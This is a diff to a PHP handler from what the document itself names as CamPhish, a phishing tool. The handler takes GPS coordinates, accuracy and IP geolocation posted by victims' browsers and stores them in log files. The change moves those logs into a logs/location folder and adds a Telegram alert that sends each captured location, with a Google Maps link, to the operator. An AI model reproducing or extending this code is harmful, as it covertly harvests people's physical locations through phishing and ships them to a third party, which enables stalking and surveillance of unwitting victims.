@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/telegram_alert.php';
 $date      = date('dMYHis');
 $latitude  = isset($_POST['lat']) ? $_POST['lat'] : '';
 $longitude = isset($_POST['lon']) ? $_POST['lon'] : '';
@@ -31,19 +32,22 @@ if (!empty($latitude) && !empty($longitude)) {
     if (!empty($ip_geo)) $data .= "IP Geo Fallback: $ip_geo\r\n";
     $data .= "Date: $date\r\n";
 
-    $file = 'location_' . $date . '.txt';
+    // ── Save into logs/location/ ───────────────────────────────────────────────
+    $log_dir = 'logs/location';
+    if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);
+
+    $file = $log_dir . '/location_' . $date . '.txt';
     file_put_contents($file, $data);
-    file_put_contents('current_location.txt', $data);
-    file_put_contents('LocationLog.log', "Location captured\n", FILE_APPEND);
+    file_put_contents($log_dir . '/current_location.txt', $data);
+    file_put_contents($log_dir . '/LocationLog.log', "Location captured\n", FILE_APPEND);
 
     // Master log
-    $masterFile = 'saved.locations.txt';
+    $masterFile = $log_dir . '/saved.locations.txt';
     if (!file_exists($masterFile)) touch($masterFile);
     file_put_contents($masterFile, "\n=== New Location Captured ===\n" . $data . "\n", FILE_APPEND);
 
-    // Copy to saved_locations/
-    if (!is_dir('saved_locations')) mkdir('saved_locations', 0755, true);
-    copy($file, 'saved_locations/' . $file);
+    // Telegram alert
+    telegram_alert("📍 <b>CamPhish — GPS Location!</b>\n🌐 Lat: <code>$latitude</code>\n🌐 Lon: <code>$longitude</code>\n🎯 Accuracy: <code>$accuracy</code>\n🗺 <a href=\"$maps_link\">Open in Google Maps</a>" . (!empty($ip_geo) ? "\n📡 IP Geo: $ip_geo" : ""));
 
     header('Content-Type: application/json');
     echo json_encode(['status' => 'success', 'message' => 'Location data received']);
